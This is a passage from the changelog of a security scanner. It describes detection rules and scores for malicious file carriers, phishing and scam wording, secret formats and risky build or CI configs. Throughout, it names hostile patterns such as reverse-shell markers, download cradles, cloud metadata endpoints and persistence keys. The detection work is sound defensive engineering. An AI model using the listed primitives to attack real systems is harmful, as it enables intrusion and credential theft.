  `Pipfile`/`Pipfile.lock` `[[source]]`/url → 45; `MODULE.bazel`/
  `WORKSPACE` `http_archive`/`git_repository`/`local_repository`/
  `register_toolchains` → 45 (plain `bazel_dep` stays clean);
  `Brewfile` `tap`/`brew`/`cask` → 45; `conanfile.py` with
  `os.system`/`subprocess`/`eval(`/`exec(`/`tools.download`/`tools.get`
  → 50 (a plain conanfile stays clean); `Dangerfile`/`Guardfile`/
  `Capfile` `sh`/`system`/backtick/`exec`/`curl` → 45; `aria2.conf`
  `on-download-*`/`command`/`rpc-secret` → 50; `pacman.conf`
  `XferCommand`/`SigLevel = Never` → 50; `makepkg.conf` `DLAGENTS` → 50;
  `apt.conf*` `*-Invoke`/`Pre-Install`/`DPkg::` → 55; `sources.list`
  `deb `/`deb-src`/`signed-by` → 45; `.rtorrent.rc` `execute`/
  `schedule`/`system.method` → 50; `sysctl.conf` `core_pattern` pipe
  → 55 (root exec on any crash); `xorg.conf` `ModulePath`/`Load` → 45;
  `grub.cfg`/`grub.conf`/`menu.lst`/`syslinux.cfg`/`isolinux.cfg`/
  `pxelinux.cfg`/`loader.conf`/`grub.d`/`%_custom` with `init=`/
  `rdinit`/`chainloader`/`configfile`/`linux`/`append` → 50 (boot-arg
  or image swap); `anacrontab` schedule lines → 40; `.dir-locals.el`/
  `dir-locals.el` `(eval`/`shell-command` → 55 (exec on any file open
  in that directory).
- **Credential-store + service-spawner + handler carriers**
  (`hlse_file.c`, F56): `.pgpass`/`pgpass.conf` → 40/45, `.boto`
  `aws_*` → 50, `.pypirc` `repository`/`password`/`username` → 45,
  `.dockercfg`/`.dockerconfigjson` `auths` → 50, `.htpasswd` hash
  entries → 45 (plaintext/encoded credential stores arriving as
  files); `*.timer`/`*.socket`/`*.path` units with `[Timer]`/
  `[Socket]`/`[Path]`/`OnCalendar`/`ListenStream`/`OnBootSec`/`Accept=`
  → 45 (a dropped unit activates its paired .service on schedule,
  connect, or path change); `xinetd.conf`/`inetd.conf`/`supervisord.
  conf`/`supervisor.conf` with `server`/`command`/`socket_type`/
  `[program:` → 50 (per-connection and boot daemon spawn);
  `mimeapps.list`/`defaults.list` reassigning `x-scheme-handler` → 45
  (xdg-open launches the attacker's .desktop; a plain local
  `text/plain=vim.desktop` mapping stays clean).
- **Package-manager / cloud-credential config carriers** (`hlse_file.c`,
  F56 + F18): `.npmrc`/`npmrc`/`.yarnrc*`/`yarnrc.yml` whose
  `registry`/`script-shell`/`unsafeHttpWhitelist`/`npmRegistryServer`/
  `plugin` re-point the package resolver or lifecycle shell → 50;
  `.pnpmfile.cjs`/`.pnpmfile.js` running JS hooks on every install
  → 45 (bare) / 50 (with `eval`/`require(`/`child_process`/`exec`/
  `curl`/`wget`); `.gemrc`/`gemrc` with a `source:`/`http` line → 45
  (gem resolution redirect); `config.toml` carrying the cargo keys
  `rustc-wrapper`/`rustflags`/`[alias]`/`[patch.*]`/`[source.*]`/`[path`
  → 50 (a dropped `.cargo/config.toml` swaps the compiler binary);
  `config.json` with `credsStore`/`credHelpers` → 50 (docker executes
  the named credential-helper binary on login/pull); maven
  `settings.xml`/`settings-security.xml`/`toolchains.xml` with
  `<mirror>`/`<server>`/`<proxy>`/`<url` → 45 (artifact resolution
  redirect); `init.gradle`/`settings.gradle`/`build.gradle` (+`.kts`)
  with `eval`/`exec`/`curl`/`wget`/`http`/`url` → 50 (configure-time
  payload). F18's plain-`config` path gate now also admits `.aws/` /
  `.kube/` / `.docker/` trees, and flags `credential_process` and
  kubeconfig `exec:`+`command:` blocks at 55.
- **Build-file + session-startup + mailer carriers** (`hlse_file.c`,
  F56): `wscript`/`SConstruct`/`meson.build`/`Rakefile`/`Rakefile.rb`/
  `Earthfile`/`Taskfile.{yml,yaml}` whose body reaches `os.system`/
  `subprocess`/`run_command`/`run_target`/`system(`/backtick/`curl`/
  `wget`/`Invoke-WebRequest`/`http`/`eval `/`exec(`/`|sh`/`base64`
  → 55 (build/configure-time exec — the `executable(`-only meson file
  stays clean); `init.el`/`.emacs`/`early-init.el`/`.Rprofile`/
  `.ghci`/`.latexmkrc`/`.conkyrc`/`conky.conf`/`activate*`/
  `.octaverc` whose startup code reaches `shell-command`/
  `call-process`/`system`/`os.execute`/`${exec`/`:!`/`curl`/`wget`/
  `eval`/backtick/`|sh` → 50 (session-start exec — benign configs
  stay clean); `.gdbinit`/`.lldbinit` with `shell`/`python`/`system`/
  `source`/`eval`/`command script` → 50 (debugging-session exec);
  `.msmtprc` `passwordeval` → 50, `.fetchmailrc` `postconnect`/
  `preconnect`/`mda`/`bsmtp` → 45, `.isyncrc`/`.mbsyncrc` `PassCmd`/
  `PipeCommand` → 50, `.ripgreprc` `--pre`/`--hostname-bin` → 50
  (mailer/searcher configs that run an external command on every
  invocation).
- **Windows-library / keybind / DB-client carriers** (`hlse_file.c`,
  F56): `.library-ms`/`.searchConnector-ms` descriptors whose `<url>`
  targets a remote http/UNC share → 45 (opening the folder leaks the
  NTLM hash and shows attacker content as a local library);
  `.inputrc`/`_inputrc` macro bindings that map a key to a string
  ending in a newline escape → 45 (next keypress types the attacker's
  command in any readline app); `.xbindkeysrc` binding to a fetcher/
  shell/destructor primitive (`curl`/`wget`/`http`/`sh -c`/`bash`/
  `rm -`/`nc`/`ncat`) → 50; `.my.cnf`/`my.cnf`/`my.ini` `pager =`/
  `tee =` directives → 50 (client runs an external program or pipes
  every session); `.sqliterc` `.shell`/`.system`/`.output`/`.once`
  → 50 and `.psqlrc` `\!`/`\o`/`copy … program` → 45 (DB-client
  startup files that execute or pipe to external commands on connect).
- **Credential/session carrier files** (`hlse_file.c`, F56):
  `.har` exports carrying cookies/authorization/token entries → 45 (a
  stolen-session file); `.rhosts`/`hosts.equiv` trust entries → 50
  (passwordless rsh auth bypass); `.netrc`/`_netrc` with
  `machine…password` → 50 (plaintext cred store); network device
  configs (`running-config`/`startup-config`/`*.cfg`) with
  `enable password`/`enable secret`/`snmp-server community`/
  `crypto isakmp key`/`tacacs|radius key`/`username … password` → 45
  (exfiltrated device credentials).
- **`.appinstaller` App Installer manifests** (`hlse_file.c`, F43):
  the msix/bundle install manifest whose `<AppInstaller>`/
  `<MainPackage>` `Uri=` points at a remote URL — the payload twin of
  the `ms-appinstaller:` URI handler → 55.
- **Non-web device/query schemes** (`hlse_core.c`): new
  `URL_DEVICE_SCHEMES` — `bluetooth:`/`bluetooth-le:`/`search:`/
  `smtps:`/`pop3:`/`imap:`/`mid:`/`cid:` → 30 (a click launches a local
  handler outside URL parsing). `wss:`/`ws:` join FETCH (a live
  websocket endpoint in content is a C2/exfil channel) → 30.
- **Postman / Docker Hub / Dynatrace secret formats**
  (`hlse_secrets.c`): `PMAK-`+40 → 80, `dckr_pat_`+20 → 80,
  `dt0c01.`+30 → 80 (new `is_alnum_or_dot` predicate carries the `.`
  segment separator inside the Dynatrace body).
- **`ms-appinstaller:`/`ms-windows-store:` URI handlers**
  (`hlse_core.c`): `ms-appinstaller:`/`ms-appinstaller-https:` hand a
  remote `?source=` package URL to the App Installer (the Emotet/
  BazarLoader AppX-installer lure) → 60 with a remote source, 35 bare;
  `ms-windows-store:` → 35.
- **Wallet-validation + task-scam lure vocabulary** (`hlse_text.c`):
  `validate/verify/restore/sync/reactivate your wallet`, `wallet
  validation` (seed-capture pages) and task-scam/pig-butchering phrases
  (`complete tasks to earn`, `task commission`, `order grabbing`,
  `recharge/deposit to unlock`, `pay to withdraw`, `unable to
  withdraw`, `account is frozen`, …) join FAKE_ALERT.
- **Payment URI schemes + wallet-drainer approval language**
  (`hlse_core.c`, `hlse_text.c`): new `URL_PAYMENT_SCHEMES` table —
  `bitcoin:`/`ethereum:`/`monero:`/`litecoin:`/`dogecoin:`/`tron:`/
  `tether:`/`payto:` (RFC 8905)/`alipay:`/`weixin:`/`upi:` → 40 (a
  payment URI hands a pre-filled transfer to the wallet/banking app;
  the destination is attacker-chosen). Text gains the drainer approval
  verbs (`setapprovalforall`, `approve unlimited`, `unlimited
  approval`, `permit2`, `increase allowance`, `claim your airdrop`,
  `connect wallet to claim`, `free mint`, `wallet verification
  required`) and the JP delivery-fee scam variants (`不在配達`,
  `配送料`, `配送料金`, `配達に失敗`, `お荷物をお届け`, `荷物の再配達`,
  `配達先の確認`, `住所を確認`, `不在連絡票`).
- **Japanese refund/e-money scam vocabulary** (`hlse_text.c`): the
  "還付金 at the ATM" / convenience-store e-money scam was invisible
  because a lone `還付金` scores 12 — under the LOG floor. Added the
  co-occurrence markers the police/FSA advisories document —
  `atmで`, `コンビニで`, `電子マネー`, `プリペイド`, `webmoney`,
  `ビットキャッシュ`, `払い戻し`, `還付`, `ご返金`, `保険料`, `年金`,
  `国保`, `国民健康保険`, `振り込め`, `送金してください` — so the
  two-signal pattern fires.
- **Scheme-table sync + remote-mount schemes** (`hlse_core.c`): the URL
  scheme tables moved to file scope so `hlse_scan`'s "is this a URL"
  prefix check and `check_url`'s scoring read the same lists — ten
  `HANDLER` schemes (`ms-visio`/`ms-access`/`ms-project`/`ms-publisher`/
  `ms-settings`/`ms-people`/`ms-calculator`/`onenote-cmd`/`itms`/`itmss`/
  `itpc`) were in the scoring table but missing from the dispatcher, so
  they never fired via the bare-operand path. `HANDLER` gains
  `vscode:`/`vscode-insiders:`/`atom:`; new `NETMNT` table: `smb:` → 55
  (NetNTLM-leak class, same as a `\\` UNC path), `nfs:`/`afp:`/`vnc:`/
  `rdp:` → 40.
- **F52–F55 dropped server-config checks** (`hlse_file.c`): `.htaccess`
  PHP-handler coercion (`AddType`/`SetHandler`/`php_flag`/`php_value`/
  `Options +ExecCGI`) → 55, `Redirect`/`RewriteRule` to a remote host →
  50; `.user.ini` `auto_prepend_file`/`auto_append_file` → 55 (runs on
  every request in the dir — upload-planted persistence); IIS
  `web.config` `<httpRedirect>`/script `<handlers>`/rewrite `url="http"`
  → 55; an `.xml` Office add-in manifest whose `<OfficeApp>`/
  `SourceLocation` points at a remote page → 50.
- **F49–F51 install-carrier + build-time exec** (`hlse_file.c`): F49
  extension bundles (`.vsix`/`.xpi`/`.crx`/`.nex`/`.safariextz`/`.oxt`/
  `.whl`/`.egg`/`.gem`/`.nupkg`/`.apk`/`.ipa`) → 35, cert/key
  containers (`.cer`/`.crt`/`.der`/`.p12`/`.pfx`/`.p7b`/`.p7r`) → 30 —
  install writes code into the host app or material into the trust
  store; F50 `.rb` Homebrew formula (`< Formula`) containing
  `system`/`curl`/`wget`/`open(`/`eval` → 55 (install-time exec);
  F51 `.cabal` `build-type:Custom`/`custom-setup` → 40 (delegates the
  build to a Setup.hs script).
- **Internal-address + IMDS URL checks** (`hlse_core.c`): a URL host
  that is RFC1918/loopback/link-local/CGNAT (incl. IPv6 `::1`/`fe80::`/
  `fc`/`fd` literals) → ALERT 45; a cloud instance-metadata endpoint
  (`169.254.169.254`, `169.254.170.2` ECS, `100.100.2.136` Alibaba,
  `metadata.google.internal`, `metadata`, `instance-data`) → BLOCK 65
  — IMDS is the SSRF credential-theft target itself. Previously all
  internal destinations scored 0.
- **pod/spm manifest ecosystems** (`hlse_manifest.c/h`, `hlse_cli.c`):
  `Podfile`/`Podfile.lock` → `pod` (`source 'url'` off the CocoaPods
  trunk/CDN → 60, reusing the Gemfile source check); `Package.swift`/
  `Package.resolved` → `spm` (`.package(url:)`/`"location"` off-forge
  host → 45). `cdn.cocoapods.org`/`trunk.cocoapods.org`/
  `cocoapods.org` added to the known-registry list.
- **F48 .ica Citrix launch** (`hlse_file.c`): `[WFClient]`/
  `[ApplicationServers]` descriptor with `Address=`/`InitialProgram=`
  → 45 — opening the file launches a remote published app.
- **F47 UTF-16 decode before content analysis** (`hlse_file.c`): a
  BOM-prefixed UTF-16LE/BE file hides ASCII payloads behind
  interleaved NUL/high bytes — every string-based F-check saw only
  noise (a UTF-16 .ps1 download cradle scored LOG 30). The first 4KB
  head is now decoded in place when a BOM is present (LE low byte /
  BE high byte, NULs → `?`) and all content checks run on the decoded
  text; the decode itself is logged at 15 as an encoding-evasion
  signal. Probed: UTF-16 cradle now reaches ISOLATE 100.
- **F44–F46 spreadsheet/launch carriers** (`hlse_file.c`): F44 formula
  injection — `.slk` SYLK `EEXEC(`/auto-exec → 55 (runs without a
  macro prompt), `.iqy`/`.rqy`/`.dsy` WEB query to remote source → 45,
  `.csv`/`.tsv`/`.txt` cell leading `=`/`+`/`-`/`@` + `cmd`/`dde`/
  `webservice(`/`hyperlink("http` → 50 (DDE/Excel open-time exec);
  F45 `.jnlp` `<jnlp` with remote `codebase=`/`href=`/`url=` → 50
  (javaws fetches+launches jars on open); F46 `.sct` `<scriptlet>`
  +`<script`/`<registration` → 45, +CreateObject/WScript.Shell/cmd/
  powershell → 55 (regsvr32 scrobj.dll Squiblydoo bypass).
- **F4 tiering for OLE macro docs** (`hlse_file.c`): the single
  "VBA indicators" signal is now three bands — bare `VBA` byte-run →
  LOG 35 (a doc may merely mention VBA), VBA + macro storage streams
  (`Macros`/`PROJECT`/`dir`) → ALERT 55, auto-executing entry point
  (`AutoOpen`/`AutoExec`/`Document_Open`/`Workbook_Open`) → BLOCK 65
  (Emotet/Dridex-class maldoc payload).
- **F41–F43 script-host/installer carriers** (`hlse_file.c`): F41
  `.wsf`/`.wsh` `<job><script>` scriptlet → 45, +CreateObject/
  WScript.Shell/run/exec → 55 (script-host dropper); F42 `.inf`
  `[DefaultInstall]`/`[Install]` → 40, +RunPreSetupCommands/
  RunPostSetupCommands/AddService/CopyFiles/DelNodes → 55
  (rundll32/cmstp exec); F43 ClickOnce `.application`/`.manifest`/
  `.vsto` `.appref-ms` `<deployment codebase=>` or bare remote
  reference → 55 (install+run on open); F32 MSBuild ext list widened
  (.vcxproj/.vcproj/.wixproj/.sqlproj/.ccproj/.pubxml).
- **nuget manifest ecosystem** (`hlse_manifest.c`, `hlse_cli.c`):
  `nuget.config`/`packages.config`/`Directory.Packages.props` route
  to `package --manifest`; `<add value="url">` / `<packageSource>`
  whose host is off the official feed (`nuget.org`/`api.nuget.org`
  via `hlse_manifest_resolved_suspicious`) → ALERT 45 (NuGet
  package-source substitution).
- **F39–F40 archive-slip + build-tool exec** (`hlse_file.c`): F39 tar
  member `..`/absolute path or ustar prefix traversal → 70 (extends
  the ZIP-slip check to tar — permissive untars escape the extract
  dir); F40 `.gradle`/`.kts`/`.sbt`/`pom.xml`/`build.xml`/`setup.cfg`
  containing an exec primitive (`exec`/`commandLine`/`processBuilder`/
  `doLast`) *plus* a fetch/exfil primitive (curl/wget/Invoke-WebRequest/
  `url.openStream`/HttpClient) → 55, or an injected non-forge
  `repositories { maven/ivy url }` → 45 (dependency substitution).
- **F36–F38 remote-access carriers** (`hlse_file.c`): F36 `.rdp`
  `drivestoredirect` → 55, clipboard/smartcard/printer/com-port/camera
  redirection → 45/40 (rogue-RDP server reads local drives and input —
  `full address:` alone stays clean); F37 `.ovpn` `up`/`down`/
  `route-up`/`ipchange`/`learn-address`/`client-connect`/`tls-verify`/
  `auth-user-pass-verify` script hooks → 55, `management` socket → 45,
  `script-security 3` → 50 (root script exec / remote control around
  tunnel events); F38 `.mobileconfig` `PayloadType` root-CA
  (`com.apple.security.*`) → 60, `com.apple.proxy`/`com.apple.vpn` →
  55, dns/ldap → 45 (silent TLS interception / traffic reroute).
- **F31–F35 parser-fed carriers** (`hlse_file.c`): F31 XML external
  entities / nested-entity expansion bomb → 65/55 on `.xml`/`.svg`/
  `.xsl`/.dtd` family (file/URL leak on parse, billion-laughs);
  F32 MSBuild `<UsingTask>` code-task factory / `<Exec>` → 60/55 on
  `.csproj`/`.proj`/`.targets`/`.props` (build-time code exec);
  F33 `.gdbinit`/`.lldbinit` `shell`/`command script import` lines →
  45 (debugger-start exec); F34 `COPY … PROGRAM` / `\!` / `LANGUAGE C`
  in `.sql` → 55/50 (DB-superuser shell/shared-object); F35
  `sitecustomize.py`/`usercustomize.py`/`conftest.py` exec markers →
  55 (interpreter autoexec persistence).
- **Manifest redirection advisories** (`hlse_manifest.c`,
  `hlse_cli.c`): go.mod `replace => ./../|/abs` local-path targets →
  LOG 30 (vendored-tree module swap; remote-host replaces already
  flagged 25/45); Cargo.toml `[patch.*]`/`[replace]` table headers →
  LOG 30 (dependency-source redirection — each row's `git =` host is
  still vetted by the VCS-source check).
- **F26 docker-compose privilege** (`hlse_file.c`): compose-named
  or `services:`+`image:`/`build:` YAML running `privileged` (70),
  host-namespace modes `network_mode|pid|ipc|uts|cgroup|userns_mode:
  host` (55), `cap_add` SYS_ADMIN/ALL (65), `docker.sock` mount (60),
  host-root/sensitive-dir bind mounts (50), `security_opt` unconfined
  (40). Shared `yaml_key_val`/`yaml_key_present` helpers.
- **F27–F30 content carriers** (`hlse_file.c`): F27 YAML
  unsafe-load tags `!!python/`, `!ruby/`, `!!perl/`, `!!php/` → 65
  (deserialization-gadget RCE on yaml.load/Psych.load; CloudFormation
  `!Ref`-style tags stay clean); F28 pickle GLOBAL opcodes to
  `system`/`eval`/`subprocess` → 70 and `.pth` `import`-line startup
  exec → 65; F29 `[autorun]` `open=`/`shellexecute`/`shell\` keys →
  55; F30 `.pac` `FindProxyForURL` returning remote PROXY/SOCKS → 45
  (WPAD traffic interception; localhost/DIRECT clean).
- **F25 privileged Kubernetes manifests** (`hlse_file.c`): a
  `.yaml`/`.yml` doc carrying `apiVersion:`+`kind:` that requests
  PodSecurity baseline/restricted violations — `privileged: true`
  (70), `capabilities` `SYS_ADMIN`/`ALL` (65), `hostPID`/`hostIPC`/
  `hostNetwork: true` (55), `allowPrivilegeEscalation: true` (45),
  `hostPath:` mounts (30). Key-boundary matching rejects
  `nothostpid:`/`myhostpath:` prefix collisions; non-k8s YAML and
  `privileged: false` stay clean.
- **plat ecosystem** (`hlse_manifest.c`): platform-automation
  configs — `.gitpod.yml` tasks, `netlify.toml`/`vercel.json`
  build commands, `Procfile`/`app.json` processes, `Jenkinsfile`
  @Library mutable-branch loads (55), `tsconfig.json`
  compilerOptions.plugins (45); exec-shaped values → 55.
- **typosquat name extraction scoped to real package ecosystems**
  (pip/npm/cargo/go/gem only) — config files no longer emit fake
  "pid (docker)" / "web (plat)" typosquat noise.
- **F24 terraform plan-exec** (`hlse_file.c`): `external` data
  source + `program` → runs at `terraform plan`; `local-exec`/
  `remote-exec` provisioners → run at apply. .tf/.tf.json → 55.
- **composer ecosystem** (`comp`): `composer.json`/`composer.lock` —
  `autoload.files` entries execute at require/dump-autoload → 55;
  `*-cmd`/`*-run`/`*-dump` lifecycle script keys with exec-shaped
  values → 55; `repositories` with vcs/git/http source → 50
  (package-resolution redirection off Packagist).
- **launch.json joins vsc** — `runtimeExecutable`/`runtimeArgs`
  binary-path keys pointing at /tmp/../absolute paths → 60.
- **direnv .envrc + Makefile parse-time exec** (`hlse_file.c`):
  `.envrc` joins F18 (exec-shaped content → 55); F23 flags
  `$(shell …)`/`!=` with fetch/interp args in Makefile/*.mk → 55
  (runs at parse time, even `make -n`).
- **pre-commit + gitlab-ci ecosystems** (`hlse_manifest.c`): `pck`
  flags `repo: local` + exec-shaped `entry:` (60) and
  `language: system|script` (40); `glci` flags `include:remote`
  URL (55) and `script:`/`before_script:`/`after_script:` block
  lines that fetch|pipe (55, indent-tracked). Fixed misrouting:
  `.gitlab-ci.yml` was previously claimed by the `gha` ecosystem.
- **F18 git exec-config keys** (`hlse_file.c`): under `[core]`/
  `[filter]`/`[credential]` sections the exec keys appear bare —
  `fsmonitor`/`editor`/`pager`/`external`/`clean`/`smudge`/`helper`/
  `program` values that look executable (path, `!`, interpreter,
  fetch) score 55; `include.path` scores 40. Plain `editor = vim` /
  `helper = osxkeychain` stay clean.
- **docker-compose hardening** (`hlse_manifest.c`): compose files
  previously parsed through the Dockerfile grammar only; now
  `privileged` → 65, docker.sock/containerd.sock/crio.sock mounts
  → 55, host pid/network/ipc/uts → 50, `cap_add` SYS_*/ALL → 55,
  seccomp unconfined → 45 (HLSE-PKG-DCOMPOSE).
- **IDE autoexec ecosystems** (`devc`, `vsc`): `devcontainer.json` /
  `*.devcontainer.json` lifecycle commands with exec-shaped values →
  60 (60), privileged/mount hints → 55; `.vscode/tasks.json`
  `runOn: folderOpen` → 65, `settings.json` binary-path keys
  pointing into the workspace or /tmp → 60, task commands that
  fetch/pipe → 55 (HLSE-PKG-IDEEXEC).
- **GHA pwn-request compound** (`hlse_cli.c`): `pull_request_target`
  plus a step materialising `${{ github.head_ref }}` /
  `pull_request.head.*` → 65, once per file (HLSE-PKG-GHAPWN).

- **`.theme` NetNTLM leak** — `.theme`/`[Theme]`-style INI carriers
  (Wallpaper=, ItemNPath=, ImagesRootPIDL=) now feed the F10 UNC/WebDAV
  check; a remote `\\host\share` wallpaper leaks NetNTLM on load
  (ThemeBleed CVE-2024-38030 class).
- **New credential formats** — secret patterns for Google OAuth
  (`ya29.`), Tailscale (`tskey-`), Sentry (`sntrys_`), Grafana Cloud
  (`glc_`), Fly.io (`fo1_`), Terraform Cloud (`atlasv1.`) and
  Dynatrace (`dt0c01.`); `SG.` SendGrid already covered.
- **URI-handler schemes** (`hlse_core.c`): `search-ms:`/`ms-msdt:`/
  `ms-officecmd:`/`ms-word:`/`ms-excel:`/`ms-powerpoint:`/`onenote:`/
  `itms-services:` route through `check_url`; an embedded remote
  indicator (http/UNC/|u|/location=) scores 60, bare scheme 35 —
  the search-ms NetNTLM-leak / Follina / office-remote-doc class.
- **F22 OOXML macro smuggling** (`hlse_file.c`): a `vbaProject.bin`
  zip member in a container named like a macro-free format
  (.docx/.xlsx/.pptx…) scores 65; declared macro containers
  (.docm…) 35; unknown extension 50.
- **GHA script-injection check** (`hlse_manifest.c` + `hlse_cli.c`):
  untrusted `${{ github.event.* }}` contexts (issue/PR title+body,
  comment, review, commits, inputs, head_ref, workflow_run head
  fields) interpolated inside `run:`/`script:` — including
  block-scalar `run: |` bodies tracked by indentation — score 60
  (HLSE-PKG-GHAINJ).
- **mcp ecosystem** (`hlse_manifest.c` + `hlse_cli.c`):
  `mcp.json`/`.mcp.json`/`claude_desktop_config.json`/`cline_mcp_settings.json`
  configs scan for pipe-to-shell installs (70), bare-shell or
  fetch commands (60/70), privileged/host-mounted containers (65),
  plaintext http:// remote endpoints (55), opaque `-c`/`-enc` args
  (55) — MCP tool-poisoning surface (HLSE-PKG-MCPRISK).


- **Fully percent-encoded URL** (`hlse_core.c`): input starting with
  `%` is decoded on a bounded copy; when a scheme emerges the decoded
  form is checked as a URL plus a 25-point extraction-evasion reason.
  Browsers reject encoded schemes, but any layer that decodes first
  (redirect params, sanitizers, log viewers) resolves the real link.
- **F21 meta-refresh redirect** (`hlse_file.c`): `<meta
  http-equiv=refresh content="N;url=http(s)://…">` → 55 (or `//host`
  → 50) — a static HTML attachment that bounces the viewer to a
  remote page on open, invisible to gateways rendering it as HTML.
- **New secret formats** (`hlse_secrets.c`): `AGE-SECRET-KEY-1…` (Age
  encryption key, 90), `dop_v1_`/`dp.st.`/`dp.pt.` Doppler tokens (85).

### Fixed

- **`check_mnemonic` quadratic scan**: a lowercase run longer than the
  8-char word cap (e.g. a megabyte of one letter) rescanned the run on
  every position — the scanner now skips the whole over-long word.
  Found by the >1 MiB stdin integration check hanging.


- **F19 reverse-shell detection** (`hlse_file.c`): content-driven —
  `/dev/tcp/` socket redirects → 65, `nc -e`/`ncat -e`/`socat exec:` →
  60, `bash -i >&` → 60, python `socket`+`dup2`+`pty`/`/bin/sh` → 60.
  Applies to any file type (a Makefile or cron line is just as live).
- **F20 HTML `<base>` hijack** (`hlse_file.c`): `<base href>` with an
  absolute http(s) URL → 55, protocol-relative `//host` → 50 — one tag
  repoints every relative link, form action, and image on the page.
- **F18 extension** — ssh client config: `.ssh/config` `ProxyCommand`/
  `LocalCommand`/`Match exec` → 55 (CVE-2023-51385 class),
  `PermitLocalCommand` → 40.
- **Cargo build-toolchain override** (`hlse_manifest.c` +
  `hlse_cli.c`): `.cargo/config.toml` `rustc-wrapper`/`runner`/
  `linker`/`pre-build`/`post-build` with a path-form value → 50
  (HLSE-PKG-CARGOTC). Bare tool names (`sccache`, `clang`) resolve via
  PATH and stay clean.


- **F18 rc/persistence-file check** (`hlse_file.c`): filenames a shell,
  sshd, or git reads automatically — `.bashrc`/`.zshrc`/`.profile`/
  `authorized_keys`/`crontab`/`.gitconfig` (and `config` inside `.git/`
  only). Content keys: `LD_PRELOAD`/`DYLD_INSERT`/`LD_LIBRARY_PATH` →
  65; `PROMPT_COMMAND`/`precmd`/`alias sudo`/`trap` → 55; git
  `hooksPath` → 60 (GitBless-class redirect), `sshCommand` → 45,
  `insteadOf` → 50; `authorized_keys` `command=`/`environment=`/
  `permitopen`/`permitlisten`/`permituserenv` → 50. Filename-keyed so
  the same lines in an inert file stay clean.


- **Container/CI manifest scanning** (`hlse_manifest.c` +
  `hlse_cli.c`): `package --manifest` now infers two new ecosystems —
  `docker` (Dockerfile/Containerfile/docker-compose) and `gha`
  (`.github/workflows/*.yml`, `.gitlab-ci*`).
  - `docker`: `FROM` with an off-allowlist registry host → 45
    (HLSE-PKG-DFROM); `RUN`/`CMD`/`ENTRYPOINT` fetch|pipe|interpreter
    (`curl … | sh`) → 60 (HLSE-PKG-DPIPESHL); `ADD http(s)://` remote
    fetch without checksum → 35 (HLSE-PKG-DADD). Container registries
    added to the allowlist: docker.io/ghcr.io/gcr.io/quay.io/
    mcr.microsoft.com/public.ecr.aws/registry.k8s.io/docker.pkg.dev.
  - `gha`: `pull_request_target` trigger → 40 (HLSE-PKG-GHAPRT — runs
    fork code with base-repo secrets); `uses:` with a mutable ref
    (branch/tag) → 35, with no ref → 45 (HLSE-PKG-GHAUNPIN — the
    tj-actions compromise class; a 40-hex commit SHA is clean).
- **Hex private key + BIP39 mnemonic secrets** (`hlse_secrets.c`):
  `0x` + exactly 64 hex → HEX_PRIVATE_KEY (55); a canonical-length
  BIP39 run (12/15/18/21/24 lowercase words, 3–8 chars, ≥n−2 distinct)
  → MNEMONIC_PHRASE — 45 bare, 75 with a seed/mnemonic/recovery/
  wallet/phrase keyword in the 48-char context. Both are heuristic
  class; prose-length filtering keeps ordinary sentences clean.


- **Backslash URL confusion** (`hlse_core.c`): WHATWG treats `\` as
  a path separator in special schemes — `https:\\evil.example\x`
  resolves like `https://evil.example/x`; `evil.com\@brand.com`
  displays a credential-trick the wrong way round (the REAL host is
  the first one). Special-scheme URLs are backslash-normalized on a
  stack copy before parsing; a `\` before `@` adds reason 50.
  Dispatch gate accepts `http(s):\\`, `http(s):/\` prefixes.
- **F16 PDF auto-actions** (`hlse_file.c`): `%PDF` magic +
  `/OpenAction`/`/AA` trigger with `/JS`/`/JavaScript`/`/Launch`/
  `/EmbeddedFile` payload → 65; payload-only latent capability → 40.
- **F17 RTF object embedding** (`hlse_file.c`): `\objdata`/`\objocx`/
  `\objclass` OLE payloads → 65; `\*\template` with a remote URL
  (template injection) → 65.
- **HTTP auth-header secrets** (`hlse_secrets.c`): KV_SECRET keys now
  include `authorization`, `x-api-key`, `x-auth-token`,
  `x-access-token`, `proxy-authorization`; a leading `Bearer`/`Basic`/
  `token` scheme word is stripped so `Authorization: Bearer <tok>`
  yields the credential.


- **F14 script download-cradle check** (`hlse_file.c`): MITRE
  T1059/T1105 stagers — fetch+execute pairs (DownloadString/IEX,
  curl|bash, certutil, bitsadmin, mshta/regsvr32/rundll32) score 65
  in script files, 55 elsewhere; encoded `-enc` payloads (long
  base64 run) 60; execution-policy bypass tells 45-60. Benign
  `-enc utf8` (-Encoding abbreviation) stays clean.
- **F15 .reg persistence check** (`hlse_file.c`): a `.reg` file
  writing Run/RunOnce/IFEO/Debugger/Winlogon/UserInit keys → 65 —
  the double-click autostart primitive.
- **pyproject.toml / poetry.lock / Pipfile.lock** map to the pip
  ecosystem; `hlse_manifest_name_pip` now extracts quoted names —
  PEP 621 `dependencies = ["req..."]` arrays and TOML continuation
  lines.


- **Generic key=value credential detection** (`hlse_secrets.c`):
  `check_kv_assignment` catches freeform secret assignments that
  `PASSWORD=` constants miss — lowercase keys, spaces around the
  separator, `key: value` YAML/INI form, quoted or bare values
  (`password = "x"`, `db_pass: hunter2`, `api-key: abc...`).
  Schema words (`password: required`), variable/template refs
  (`$`/`${`/`{`/`<`), function calls, uniform values, and the shared
  placeholder-marker list are suppressed; KV_SECRET reports
  confidence `heuristic` like ENV_SECRET/GENERIC_SECRET.
- **Active-HTML-markup signal** (`hlse_text.c`): `<script`,
  `<iframe`, `<embed`, `<object`, `srcdoc=`, `onX=` handlers,
  `<form action`, `<base href`, `javascript:` inside scanned text
  score 30+15/hit (cap 50) — the primary payload surface of HTML
  email phishing and chat-based script smuggling. Inert tags
  (`<div>`, `<p>`) are unaffected.

- **Open-redirect laundering detection** (`hlse_core.c`): query
  parameters (`url=`/`next=`/`redirect=`/`return=`/`dest=`/
  `continue=`/`goto=`/`target=`/`rurl=`/`forward=`/`to=`/`out=`/…)
  carrying an absolute URL whose host differs from the outer host
  score 40 — the trusted-domain-forwards-to-attacker staple of
  phishing kits. `%3a%2f%2f`-encoded targets recognised; relative
  and same-site (subdomain) targets stay clean.
- **go.mod `replace` and Gemfile `source` checks**
  (`hlse_manifest.c`, `hlse_cli.c`): `replace foo => host/path`
  substitutes a module's source — off-forge hosts score 45,
  forge-hosted 25 advisory (HLSE-PKG-GOREPLACE); local `./`/`../`
  replacements stay clean. `source "url"`/`source: "url"` swaps the
  whole rubygems server — off-allowlist scores 60
  (HLSE-PKG-GEMSOURCE). `REGISTRY_HOSTS` now covers the other
  canonical registries (rubygems.org, pypi.org, proxy.golang.org,
  crates.io/index.crates.io, repo.maven.apache.org, nuget.org).

- **Non-web URI scheme layer** (`hlse_core.c`): the URL gate was
  limited to http(s)/javascript:/data:, so every other scheme fell
